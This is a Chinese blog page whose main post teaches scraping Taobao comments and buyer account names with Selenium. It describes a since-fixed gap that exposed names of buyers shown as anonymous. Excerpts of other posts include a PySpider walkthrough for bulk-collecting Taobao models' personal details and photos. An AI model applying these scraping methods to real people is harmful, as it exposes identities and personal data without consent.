                  <p>嗯，淘宝，它一直是个难搞的家伙。 而且买家在买宝贝的时候大多数都是匿名评论的，大家都知道非匿名评论是非常有用的，比如对于大数据分析，分析某个宝贝的购买用户星级状况等等。 现在已经不能获取非匿名了，此句已没有意义了。 对于抓淘宝，相信尝试过的童鞋都能体会到抓取它到艰辛，最简单的方法莫过于模拟浏览器了，本节我们就讲解一下利用 Selenium 抓取淘宝评论的方法。 项目提供了如下功能：</p>
                  <ul>
                    <li>输入淘宝关键字采集淘宝链接并写入到文件</li>
                    <li>从文件读取链接，执行评论采集</li>
                    <li>将评论和旺旺号保存到 Excel 中</li>
                    <li>记录当前采集链接索引，保存进度</li>
                  </ul>
                  <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2>
                  <p>在开始本节之前 你需要了解一些基础知识，我们需要用到 Selenium 这个东西，详情请看 <a href="http://cuiqingcai.com/2599.html">Selenium 用法</a> 我们首先讲解一下你需要做怎样的配置。 首先你需要安装 Python，版本是 2.7 然后需要安装的 Python 类库。</p>
                  <figure class="highlight armasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="symbol">pip</span> install pyquery <span class="keyword">selenium </span>twisted requests xlrd xlwt xlutils</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装浏览器 Chrome，安装浏览器 Chrome，安装浏览器 Chrome。 然后下载 ChromeDriver，ChromeDriver 是驱动浏览器的工具，需要把它配置到环境变量里。 有的童鞋说，为什么不用 PhantomJS，因为为了防止淘宝禁掉我们，需要登录淘宝账号，登录过程可能会出现奇奇怪怪得验证码，滚动条，手机验证，如果用 PhantomJS 的话不方便操作，所以在这里我们就使用 Chrome 了。 <a href="http://chromedriver.storage.googleapis.com/index.html?path=2.7/" target="_blank" rel="noopener">ChromeDriver</a> 上面是 ChromeDriver 的下载地址，谷歌都上得了，这个不在话下吧，这是最官方的版本，其他链接请自行搜索。 找到对应平台的 ChromeDriver，解压后将可执行文件配置到环境变量里，配置到环境变量里，配置到环境变量里！重要的话说三遍。</p>
                  <h2 id="流程简述"><a href="#流程简述" class="headerlink" title="流程简述"></a>流程简述</h2>
                  <p>首先我们拿一个例子来演示一下全过程。 随意打开天猫一个链接 <a href="https://world.tmall.com/item/45262540681.htm?spm=a220m.1000858.1000725.110.r7oyq2&amp;id=45262540681&amp;skuId=85225485607&amp;areaId=320700&amp;cat_id=50025145&amp;rn=6f644caecfa85abefea71e2dc48ac6ae&amp;user_id=2148264599&amp;is_b=1" target="_blank" rel="noopener">示例链接</a> 我们首先观察一下评论，可以发现所有的评论都是匿名的。即使这个用户不是匿名评论的，那也会显示匿名，淘宝这保密做的挺好。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-1@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-1@2x-825x1024.png" alt="QQ20160630-1@2x"></a> 心机的淘宝啊，那我们如果想获取一些旺旺号该咋办？ 接下来我们返回宝贝详情页面，然后一直下拉下拉，拉到最最后，可以看到有个“看了又看”板块。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-0@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-0@2x-765x1024.png" alt="QQ20160630-0@2x"></a> 有没有！！发现了新大陆，这是什么？这是此宝贝相关宝贝以及它的一些评论。 看到了有非匿名用户了，哈哈哈，淘宝加密了评论，推荐部分却没有加密。 嗯，就从这里，我们把它们的旺旺号都抓下来，顺便把评论和购买的宝贝抓下来。 现在已经全部改成了匿名，上述话已经无意义了。 那么抓取完之后，保存到哪里呢？为了便于管理和统计，在这里保存到 Excel 中，那么就需要用到 xlrd, xlwt, xlutils 等库。 嗯，动机就是这样。</p>
                  <h2 id="实战爬取"><a href="#实战爬取" class="headerlink" title="实战爬取"></a>实战爬取</h2>
                  <h3 id="抓取过程"><a href="#抓取过程" class="headerlink" title="抓取过程"></a>抓取过程</h3>
                  <p>首先我们观察这个链接，在最初的时候，其实网页并没有加载最下方的“看了又看”内容的，慢慢往下滑动网页，滑到最下方之后，才发现看了又看页面才慢慢加载出来。 很明显，这个地方使用了 Ajax，由于我们用的是 Selenium，所以这里我们不能直接来模拟 Ajax 的 Request，需要我们来模拟真实的用户操作。 所以我们要模拟的就是，在网页部分加载出来之后，模拟浏览器滑动到下方，使“看了又看”内容显示出来，然后获取网页源代码，解析之即可。 那么在这里就出现了两个至关重要的点，一个是判断网页框架大体加载出来，另一个是模拟滑动直到最下方的内容加载出来。 首先，我们解决第一个问题，怎样判断网页框架大体加载出来。我们可以用网页中的某个元素的出现与否来判断。 比如 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-2@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-2@2x-1024x254.png" alt="QQ20160630-2@2x"></a> 这一部分是否加载出来。 审查一下代码，ID 叫做 J_TabBarBox，好，那就用它来作为网页初步加载成功的标志。 在 Selenium 中，我们用显式等待的方法来判断该元素是否已经加载成功。</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    driver.get(url)</span><br><span class="line">    WebDriverWait(driver, timeout).until(</span><br><span class="line">        EC.presence_of_element_located((By.ID, <span class="string">"J_TabBarBox"</span>))</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">except</span> TimeoutException:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> is_recommends_appear(driver, max_scroll_time):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'已经成功加载出下方橱窗推荐宝贝信息'</span></span><br><span class="line">    <span class="keyword">return</span> driver.page_source</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>接下来我们需要模拟下拉浏览器，不妨直接下拉到底部，再从底部向上拉，可能需要下拉多次，所以在这里定义了一个下拉次数，那么判断“看了又看”正文内容是否出现依然可以用显式等待的方法。 浏览器审查元素发现它的选择器是 #J_TjWaterfall li <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-3@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-3@2x-1024x771.png" alt="QQ20160630-3@2x"></a> 那么可以用如下方法来判断是否加载成功</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    driver.find_element_by_css_selector(<span class="string">'#J_TjWaterfall li'</span>)</span><br><span class="line"><span class="keyword">except</span> NoSuchElementException:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>下拉过程可以用执行 JavaScript 的方法实现。</p>
                  <figure class="highlight sqf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">js = <span class="string">"window.scrollTo(0,document.body.scrollHeight-"</span> + <span class="built_in">str</span>(<span class="built_in">count</span> * <span class="built_in">count</span>* <span class="number">200</span>) + <span class="string">")"</span></span><br><span class="line"><span class="built_in">driver</span>.execute_script(js)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 count 是下拉的次数，经过测试之后，每次拉动距离和 count 是平方关系比较科学，具体不再描述，当然你可以改成自己想要的数值。 嗯，加载出来之后，就可以用</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">driver</span><span class="selector-class">.page_source</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>来获取网页源代码了 用 pyquery 解析即可。</p>
                  <figure class="highlight sqf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">doc = pq(html)</span><br><span class="line"><span class="built_in">items</span> = doc(<span class="string">'#J_TjWaterfall &gt; li'</span>)</span><br><span class="line">print u<span class="string">'分析得到下方宝贝中的用户评论:'</span></span><br><span class="line"><span class="keyword">for</span> item <span class="built_in">in</span> <span class="built_in">items</span>.<span class="built_in">items</span>():</span><br><span class="line">    url = item.<span class="built_in">find</span>(<span class="string">'a'</span>).attr(<span class="string">'href'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">not</span> url.startswith(<span class="string">'http'</span>):</span><br><span class="line">        url = <span class="string">'https:'</span> + url</span><br><span class="line">    comments_info = []</span><br><span class="line">    comments = item.<span class="built_in">find</span>(<span class="string">'p'</span>).<span class="built_in">items</span>()</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">comment</span> <span class="built_in">in</span> comments:</span><br><span class="line">        comment_user = <span class="built_in">comment</span>.<span class="built_in">find</span>(<span class="string">'b'</span>).remove().<span class="built_in">text</span>()</span><br><span class="line">        comment_content = <span class="built_in">comment</span>.<span class="built_in">text</span>()</span><br><span class="line">        anonymous_str = config.ANONYMOUS_STR</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">not</span> anonymous_str <span class="built_in">in</span> comment_user:   ＃此句本来用来判断是否匿名，现淘宝已修复该漏洞，只能抓取全部匿名的了</span><br><span class="line">            comments_info.<span class="built_in">append</span>((comment_content, comment_user))</span><br><span class="line">    info.<span class="built_in">append</span>(&#123;<span class="string">'url'</span>: url, <span class="string">'comments_info'</span>: comments_info&#125;)</span><br><span class="line">return info</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后保存到 Excel 中。 运行结果截图 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-7@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-7@2x-1024x644.png" alt="QQ20160630-7@2x"></a> 可以发现，另外提供了先登陆后爬取的功能，然后保存了爬取进度。</p>
                  <h3 id="采集链接"><a href="#采集链接" class="headerlink" title="采集链接"></a>采集链接</h3>
                  <p>刚才我们测试的链接是哪里来的？我们不能一个个去找吧？所以，在这里又提供了一个采集链接的过程，将采集的链接保存到文本，然后抓取的时候从文本读取一个个链接即可。 所以在这里我们模拟搜索的过程，关键字让用户输入，将搜索的链接采集下来。 在此 Selenium 模拟了输入文字，点击按钮和翻页的功能。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-4@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-4@2x-1024x789.png" alt="QQ20160630-4@2x"></a> 核心代码如下 下面的方法模拟了加载出搜索框之后输入文字点击回车的过程，将网页的结果返回。</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_results</span><span class="params">(keyword)</span>:</span></span><br><span class="line">    driver = config.DRIVER</span><br><span class="line">    link = config.SEARCH_LINK</span><br><span class="line">    driver.get(link)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        WebDriverWait(driver, config.TIMEOUT).until(</span><br><span class="line">            EC.presence_of_element_located((By.ID, <span class="string">"mq"</span>))</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'加载页面失败'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        element = driver.find_element_by_css_selector(<span class="string">'#mq'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'成功找到了搜索框'</span></span><br><span class="line">        keyword = keyword.decode(<span class="string">'utf-8'</span>, <span class="string">'ignore'</span>)</span><br><span class="line">        <span class="keyword">print</span> keyword</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'输入关键字'</span>, keyword</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> keyword:</span><br><span class="line">            <span class="keyword">print</span> word</span><br><span class="line">            element.send_keys(word)</span><br><span class="line">        element.send_keys(Keys.ENTER)</span><br><span class="line">    <span class="keyword">except</span> NoSuchElementException:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'没有找到搜索框'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'正在查询该关键字'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        WebDriverWait(driver, config.TIMEOUT).until(</span><br><span class="line">            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="string">"#J_ItemList div.productImg-wrap"</span>))</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'查询失败'</span></span><br><span class="line">    html = driver.page_source</span><br><span class="line">    <span class="keyword">return</span> html</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>下面的方法模拟了翻页的过程，到指定的翻页数目为止</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_more_link</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'正在采集下一页的宝贝链接'</span></span><br><span class="line">    driver = config.DRIVER</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        js = <span class="string">"window.scrollTo(0,document.body.scrollHeight)"</span></span><br><span class="line">        driver.execute_script(js)</span><br><span class="line">    <span class="keyword">except</span> WebDriverException:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'页面下拉失败'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        next = driver.find_element_by_css_selector(<span class="string">'#content b.ui-page-num &gt; a.ui-page-next'</span>)</span><br><span class="line">        next.click()</span><br><span class="line">    <span class="keyword">except</span> NoSuchElementException:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'找到了翻页按钮'</span></span><br><span class="line">    driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        WebDriverWait(driver, config.TIMEOUT).until(</span><br><span class="line">            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="string">"#J_ItemList div.productImg-wrap"</span>))</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'查询失败'</span></span><br><span class="line">    html = driver.page_source</span><br><span class="line">    parse_html(html)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果截图 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-5@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-5@2x-608x1024.png" alt="QQ20160630-5@2x"></a> 采集到到内容保存到 urls.txt 中 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-6@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/06/QQ20160630-6@2x-1024x484.png" alt="QQ20160630-6@2x"></a> 嗯，这下采集链接和爬取链接都有了。</p>
                  <h2 id="代码放送"><a href="#代码放送" class="headerlink" title="代码放送"></a>代码放送</h2>
                  <p>扯了这么多，许多童鞋已经蠢蠢欲动了，大声告诉我你们想要的是什么？ 哦没错！代码！ 嗯在这呢！ <a href="https://github.com/Germey/TaobaoUser" target="_blank" rel="noopener">代码</a></p>
                  <h2 id="附加扯淡"><a href="#附加扯淡" class="headerlink" title="附加扯淡"></a>附加扯淡</h2>
                  <p>嗯想说一句，在这里还提供了一些可配置项，比如翻页最大次数，超时时间，下拉次数，登录链接等等。 都可以在 config.py 中配置。</p>
                  <blockquote>
                    <ul>
                      <li>URLS_FILE</li>
                    </ul>
                    <p>保存链接单的文件</p>
                    <ul>
                      <li>OUT_FILE</li>
                    </ul>
                    <p>输出文本 EXCEL 路径</p>
                    <ul>
                      <li>COUNT_TXT</li>
                    </ul>
                    <p>计数文件</p>
                    <ul>
                      <li>DRIVER</li>
                    </ul>
                    <p>浏览器驱动</p>
                    <ul>
                      <li>TIMEOUT</li>
                    </ul>
                    <p>采集超时时间</p>
                    <ul>
                      <li>MAX_SCROLL_TIME</li>
                    </ul>
                    <p>下拉滚动条最大次数</p>
                    <ul>
                      <li>NOW_URL_COUNT</li>
                    </ul>
                    <p>当前采集到第几个链接</p>
                    <ul>
                      <li>LOGIN_URL</li>
                    </ul>
                    <p>登录淘宝的链接</p>
                    <ul>
                      <li>SEARCH_LINK</li>
                    </ul>
                    <p>采集淘宝链接搜索页面</p>
                    <ul>
                      <li>CONTENT</li>
                    </ul>
                    <p>采集链接临时变量</p>
                    <ul>
                      <li>PAGE</li>
                    </ul>
                    <p>采集淘宝链接翻页数目</p>
                    <ul>
                      <li>FILTER_SHOP</li>
                    </ul>
                    <p>是否过滤相同店铺</p>
                    <ul>
                      <li>ANONYMOUS_STR</li>
                    </ul>
                    <p>匿名用户标志，已失效</p>
                  </blockquote>
                  <p>哦，对了，程序怎么用啊？看 README！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-06-30 01:06:33" itemprop="dateCreated datePublished" datetime="2016-06-30T01:06:33+08:00">2016-06-30</time>
                </span>
                <span id="/2852.html" class="post-meta-item leancloud_visitors" data-flag-title="Python爬虫实战八之利用Selenium抓取淘宝匿名旺旺" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>5.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>5 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2817.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Other <i class="label-arrow"></i>
                  </a>
                  <a href="/2817.html" class="post-title-link" itemprop="url">Appium学习笔记</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>在网上搜了很多关于Appium的教程，但没有系统完整的教程，在网上找了本关于appium的英文书籍，边学边翻译，同时记录学习心得，与志同道合的人一起交流探讨！ 去除很多繁琐的东西，添加自己实践的东西，一起交流，有写错的或者翻译不对的地方，请各位大神指出来，一起交流进步 第一章 Appium的工作原理 1.iOS端 执行测试脚本，发送HTTP请求给Appium Server , Appium Server发送命令给Apple Instruments, Apple Instruments寻找设备，开始执行脚本；每执行一条语句都会原路返回（执行的结果也就是我们常说的log） 2.Android端 首先Appium仅支持安卓版本17或以上版本!如果需要测试17以前版本，需要使用Selendroid.它的工作原理其实与iOS工作原理一样： 执行测试脚本，发送HTTP请求给Appium Server , Appium Server发送命令给UIAutomator(&gt;=17时){Selendroid（&lt;=17）} ，UIAutomator(&gt;=17时){Selendroid（&lt;=17）} 寻找设备，开始执行脚本；每执行一条语句都会原路返回（执行的结果也就是我们常说的log） 备注：执行脚本想要给Appium发送命令，其中必须有一个翻译器，翻译成Appium能识别的命令（Selenium JSON）,这个工具简单理解就是把咱们写的脚本给转换成appium可以识别的命令。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/路由新定" class="author" itemprop="url" rel="index">路由新定</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-06-30 00:10:42" itemprop="dateCreated datePublished" datetime="2016-06-30T00:10:42+08:00">2016-06-30</time>
                </span>
                <span id="/2817.html" class="post-meta-item leancloud_visitors" data-flag-title="Appium学习笔记" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>626</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2652.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2652.html" class="post-title-link" itemprop="url">Python爬虫进阶四之PySpider的用法</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="2022-年最新-Python3-网络爬虫教程"><a href="#2022-年最新-Python3-网络爬虫教程" class="headerlink" title="2022 年最新 Python3 网络爬虫教程"></a>2022 年最新 Python3 网络爬虫教程</h2>
                  <p>大家好，我是崔庆才，由于爬虫技术不断迭代升级，一些旧的教程已经过时、案例已经过期，最前沿的爬虫技术比如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等技术层出不穷，我最近新出了一套最新最全面的 Python3 网络爬虫系列教程。</p>
                  <blockquote>
                    <p>博主自荐：截止 2022 年，可以将最前沿最全面的爬虫技术都涵盖的教程，如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等，市面上目前就这一套了。</p>
                  </blockquote>
                  <p>最新教程对旧的爬虫技术内容进行了全面更新，搭建了全新的案例平台进行全面讲解，保证案例稳定有效不过期。</p>
                  <p>教程请移步：</p>
                  <p><a href="https://cuiqingcai.com/17777.html">【2022 版】Python3 网络爬虫学习教程</a></p>
                  <p>如下为原文。</p>
                  <h2 id="审时度势"><a href="#审时度势" class="headerlink" title="审时度势"></a>审时度势</h2>
                  <p>PySpider 是一个我个人认为非常方便并且功能强大的爬虫框架，支持多线程爬取、JS 动态解析，提供了可操作界面、出错重试、定时爬取等等的功能，使用非常人性化。 本篇内容通过跟我做一个好玩的 PySpider 项目，来理解 PySpider 的运行流程。</p>
                  <h2 id="招兵买马"><a href="#招兵买马" class="headerlink" title="招兵买马"></a>招兵买马</h2>
                  <p>具体的安装过程请查看本节讲述 <a href="http://cuiqingcai.com/2443.html">安装</a> 嗯，安装好了之后就与我大干一番吧。</p>
                  <h2 id="鸿鹄之志"><a href="#鸿鹄之志" class="headerlink" title="鸿鹄之志"></a>鸿鹄之志</h2>
                  <p>我之前写过的一篇文章 <a href="http://cuiqingcai.com/1001.html">抓取淘宝 MM 照片</a> 由于网页改版，爬取过程中需要的 URL 需要 JS 动态解析生成，所以之前用的 urllib2 不能继续使用了，在这里我们利用 PySpider 重新实现一下。 所以现在我们需要做的是抓取淘宝 MM 的个人信息和图片存储到本地。</p>
                  <h2 id="审时度势-1"><a href="#审时度势-1" class="headerlink" title="审时度势"></a>审时度势</h2>
                  <p>爬取目标网站：<a href="https://mm.taobao.com/json/request_top_list.htm?page=1" target="_blank" rel="noopener">https://mm.taobao.com/json/request_top_list.htm?page=1</a>，大家打开之后可以看到许多淘宝 MM 的列表。 列表有多少？ <a href="https://mm.taobao.com/json/request_top_list.htm?page=10000" target="_blank" rel="noopener">https://mm.taobao.com/json/request_top_list.htm?page=10000</a>，第 10000 页都有，看你想要多少。我什么也不知道。 随机点击一位 MM 的姓名，可以看到她的基本资料。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-4@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-4@2x-1024x750.png" alt="QQ20160326-4@2x"></a> 可以看到图中有一个个性域名，我们复制到浏览器打开。<a href="https://mm.taobao.com/tyy6160" target="_blank" rel="noopener">mm.taobao.com/tyy6160</a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-5@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-5@2x-1024x576.png" alt="QQ20160326-5@2x"></a> 嗯，往下拖，海量的 MM 图片都在这里了，怎么办你懂得，我们要把她们的照片和个人信息都存下来。 <strong>P.S. 注意图中进度条！你猜有多少图片～</strong></p>
                  <h2 id="利剑出鞘"><a href="#利剑出鞘" class="headerlink" title="利剑出鞘"></a>利剑出鞘</h2>
                  <p>安装成功之后，跟我一步步地完成一个网站的抓取，你就会明白 PySpider 的基本用法了。 命令行下执行</p>
                  <figure class="highlight ada">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pyspider <span class="keyword">all</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
